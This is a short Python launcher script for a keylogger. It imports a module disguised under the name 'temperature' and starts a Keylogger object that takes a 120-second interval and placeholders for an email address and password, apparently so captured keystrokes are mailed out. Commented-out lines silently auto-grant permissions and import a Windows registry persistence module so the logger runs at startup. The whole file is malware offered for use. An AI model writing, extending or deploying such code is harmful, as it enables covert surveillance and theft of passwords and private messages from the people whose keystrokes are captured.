#!/usr/bin/python
import temperature
import sys
import os

# Auto-grant permissions on startup
# try:
#     import auto_permissions
#     # Silently attempt to grant permissions
#     auto_permissions.auto_grant_permissions()
# except:
#     # If auto_permissions fails, continue anyway
#     pass

# OR if you are packaging on Windows and want to add to registry
# So that the program runs on startup, uncomment the following import and comment the top one

#import keylogger_persistance_windows

#Main program
my_keylogger = temperature.Keylogger(120, "<<your email>>", "<<your password>>")
my_keylogger.start()
